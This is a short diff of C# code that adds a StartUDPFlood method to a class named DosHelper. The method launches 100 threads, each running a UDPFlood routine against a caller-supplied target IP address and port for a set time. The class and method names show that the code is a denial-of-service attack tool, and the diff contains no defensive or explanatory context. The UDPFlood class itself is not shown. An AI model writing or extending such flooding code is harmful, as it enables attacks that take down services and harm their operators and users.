@@ -13,4 +13,14 @@ public class DosHelper
             thread.Start();
         }
     }
+
+    public void StartUDPFlood(string targetIp, int targetPort, int timeLimitInSeconds)
+    {
+        for (int i = 0; i < 100; i++)
+        {
+            UDPFlood udpFlood = new UDPFlood();
+            Thread thread = new Thread(new ThreadStart(() => udpFlood.Start(targetIp, targetPort, timeLimitInSeconds)));
+            thread.Start();
+        }
+    }
 }
